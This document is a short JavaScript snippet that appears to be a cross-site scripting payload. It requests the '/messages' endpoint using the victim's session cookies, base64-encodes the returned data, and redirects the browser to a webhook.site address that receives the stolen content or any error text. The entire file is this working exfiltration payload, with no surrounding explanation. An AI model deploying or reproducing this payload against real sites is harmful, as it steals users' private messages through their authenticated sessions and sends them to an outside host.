(async function(){
  try {
    const r = await fetch('/messages', { credentials: 'include' });
    const d = await r.json();

    const encoded = btoa(JSON.stringify(d));
    location.href = 'https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8/?d=' + encodeURIComponent(encoded);
  } catch (e) {
    location.href = 'https://webhook.site/376da9f2-490d-4e83-85f5-c6ca830535d8/?err=' + encodeURIComponent(String(e));
  }
})();
